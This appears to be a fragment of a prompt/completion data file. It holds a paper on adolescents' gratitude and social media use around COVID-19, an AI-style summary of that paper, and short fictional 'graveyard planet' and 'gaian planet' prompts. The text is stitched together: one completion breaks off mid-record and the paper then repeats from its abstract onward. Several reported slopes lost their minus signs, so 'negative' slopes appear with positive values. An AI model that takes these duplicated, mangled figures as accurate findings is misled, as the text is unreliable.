with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents (for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"During the COVID-19 pandemic, adolescents have turned to social media to maintain connections with their friends. This study examined the longitudinal associations between high school adolescents' social media use and gratitude before and during the pandemic. The results showed that trajectories of gratitude and the importance of social media for meaningful conversations with friends were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice versa. These findings suggest that gratitude may be associated with and may motivate using social media to foster social connections, but may not increase overall social media use. The COVID-19 pandemic has had a significant impact on adolescents' social and psychological lives, as in-person interactions with peers have been limited. Using social media to connect with peers during COVID-19 has become essential for many adolescents. Positive engagement with peers on social media offers benefits, such as social support and engagement in self-disclosure. Direct communication with close friends on social media has been crucial for adolescents to thrive during the isolation of COVID-19. Gratitude, defined as a general orientation toward \\"seeing the positive,\\" may help adolescents cope with the social deprivation of the pandemic. Gratitude promotes positive social relationships and is often enhanced in the context of close relationships. Adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Maintaining social connections with friends on social media during the pandemic may provide opportunities for kindness and supportive relationships, leading to feelings of gratitude. Adolescents' peer interactions have been significantly impacted by the pandemic, as in-person interactions have been restricted. Maintaining friendships is crucial for adolescents to receive support and build social skills. The restrictions on peer interactions during the pandemic have increased the risk for mental health problems among adolescents. Many adolescents have expressed concerns about maintaining friendships remotely during COVID-19. Social media usage among adolescents has increased during the pandemic to compensate for limited in-person interactions. Some parents have reported excessive social media use among their children and have sought strategies to reduce it. While there is a small positive association between the frequency of social media use and adolescent internalizing symptoms, it is essential to differentiate between screen time and the quality of social media use. Positive engagement with peers on social media can lead to feelings of social belonging and positive emotions. The results of this study suggest that gratitude plays a crucial role in adolescents' motivation to use social media for meaningful conversations with friends. Adolescents who experience higher levels of gratitude may be more inclined to seek meaningful social interactions on social media. Interventions that focus on enhancing positive social media experiences and fostering gratitude among adolescents may have significant benefits for their mental health and well-being."},{"prompt":"Describe Earth became graveyard planet after controversial future","completion":"The controversy that led to Earth becoming a graveyard planet started when a powerful group of individuals pushed for the development of advanced weapons and technologies that were thought to ensure human dominance over other civilizations in the universe. As these weapons were being developed, protests erupted around the world, with many concerned citizens voicing their fears about the potential consequences of such actions. Despite the protests, the government continued to invest in the development of these weapons, causing widespread fear and uncertainty among the population. Eventually, a catastrophic event occurred, resulting in the release of a deadly virus that spread rapidly across the planet, wiping out a large portion of the human population. In the wake of this disaster, Earth became a graveyard planet, with vast swaths of land and cities left abandoned and overrun by nature. The remaining survivors were left to fend for themselves, struggling to find food, shelter, and protection from the hostile environment that now surrounded them. As the years passed, the memory of the controversial events that led to Earth's downfall faded into legend, leaving behind a silent and desolate landscape that served as a grim reminder of mankind's folly and hubris. The once thriving planet had become a graveyard, a stark reminder of the consequences of unchecked power and the cost of prioritizing progress over the welfare of its inhabitants."},{"prompt":"Describe Earth became gaian planet","completion":"After facing numerous environmental crises and challenges, Earth's inhabitants collectively decided to shift their focus towards a more sustainable and harmonious relationship with the planet.

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations 